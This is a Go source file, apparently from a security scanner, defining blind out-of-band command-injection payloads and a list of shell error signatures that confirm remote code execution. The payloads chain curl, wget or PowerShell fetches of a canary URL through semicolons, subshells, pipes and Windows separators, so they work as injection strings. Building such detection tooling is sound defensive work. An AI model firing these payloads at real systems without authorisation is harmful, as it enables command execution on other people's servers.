package injection

// cmdInjectionBlindOOBPayload describes one canary-fetching command
// injection. Tmpl carries a {{URL}} placeholder substituted with the
// canary URL before sending; the rest of the template is the shell
// metacharacter context (semicolon, subshell, pipe, Windows separator)
// that triggers execution in different host-command shapes.
type cmdInjectionBlindOOBPayload struct {
	Name string
	Tmpl string
}

// cmdInjectionBlindOOBPayloads is the curated list of canary-fetching
// command injections. One entry per distinct shell context (POSIX
// semicolon, subshell, pipe, AND chain, Windows cmd.exe, PowerShell)
// so a vulnerable sink fires the matching context without padding
// requests against non-vulnerable sinks. curl is preferred over wget
// because it is bundled with Windows 10+ and most modern Linux
// distributions; the wget fallback covers older POSIX hosts.
var cmdInjectionBlindOOBPayloads = []cmdInjectionBlindOOBPayload{
	// POSIX unquoted-arg context: `; curl URL` chains a new statement
	// onto the host command. The most common shell context.
	{Name: "semicolon-curl", Tmpl: `; curl {{URL}}`},
	// Subshell substitution variants: detonate inside double-quoted
	// shell arguments where bare ; / && get quoted out. Both kept
	// because legacy /bin/sh strips $() while bash strips nothing.
	{Name: "dollar-paren-curl", Tmpl: `$(curl {{URL}})`},
	{Name: "backtick-curl", Tmpl: "`curl {{URL}}`"},
	// Pipe variant: secondary unquoted-arg context that triggers some
	// sinks where the semicolon is parsed by a wrapping flag parser
	// before reaching the shell.
	{Name: "pipe-curl", Tmpl: `| curl {{URL}}`},
	// AND chain variant.
	{Name: "and-curl", Tmpl: `&& curl {{URL}}`},
	// wget fallback for hosts where curl is absent (older Debian /
	// minimal Alpine builds without the curl package).
	{Name: "semicolon-wget", Tmpl: `; wget -q -O- {{URL}}`},
	// Windows cmd.exe: `&` chains commands; Windows 10+ ships curl.
	{Name: "windows-curl", Tmpl: `& curl {{URL}}`},
	// PowerShell fallback for Windows hosts without curl on PATH or
	// for sinks that funnel into pwsh/powershell.exe directly.
	{Name: "windows-powershell-iwr", Tmpl: `& powershell -Command "iwr {{URL}}"`},
}

// CmdErrorPatterns returns shell error signatures that indicate command
// execution. Patterns are lowercase and matched against a lowercased response
// body. When found in a response alongside an injected canary, they confirm
// blind RCE. Curated to cover POSIX shells and Windows cmd.exe.
func CmdErrorPatterns() []string {
	return []string{
		// POSIX shells: command not found is the most reliable signal
		"command not found",
		"not found: command",
		// bash-specific
		": not found",
		"bad substitution",
		"command substitution: line",
		// zsh
		"command not found:",
		// Broader POSIX syntax errors
		"syntax error",
		"unexpected token",
		"unexpected operator",
		// Windows cmd.exe
		"is not recognized as an internal or external command",
		"'\\' is not recognized",
		"cannot find the path specified",
		// PowerShell
		"is not recognized as the name of a cmdlet",
		"is not recognized as the name of",
		"object reference not set to an instance",
		// Generic shell indicators
		"bash: ",
		"sh: ",
		"/bin/sh: ",
		"permission denied",
		"no such file or directory",
	}
}
